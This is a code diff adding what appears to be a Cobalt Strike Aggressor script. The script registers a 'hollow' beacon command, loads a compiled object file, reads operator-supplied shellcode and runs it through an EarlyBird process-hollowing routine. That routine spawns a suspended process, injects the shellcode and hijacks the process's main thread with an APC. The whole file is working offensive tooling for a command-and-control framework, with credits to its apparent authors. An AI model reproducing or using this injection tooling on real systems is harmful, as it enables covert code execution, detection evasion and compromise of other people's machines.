@@ -1,0 +1,29 @@
+beacon_command_register(
+    "hollow", 
+    "EarlyBird process hollowing technique - Spawns a process in a suspended state, injects shellcode, hijack main thread with APC, and execute shellcode", 
+    "Synopsis: hollow /path/to/hollow/pe /local/path/to/shellcode.bin"
+);
+
+alias hollow {
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("hollow"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("hollow.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $sc_handle = openf($3);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+    $args = bof_pack($1,"zb",$2,$sc_data);
+    btask($1, "HOLLOW - EarlyBird Remote Process Shellcode Injector (@0xBoku|github.com/boku7) | (@JTHam0|github.com/Rodion0) ");
+    btask($1, "            (@n00bRage|github.com/josephkingstone) | (@OakTree__|github.com/git-oaktree)");
+    btask($1, "Reading shellcode from: $+  $3");
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
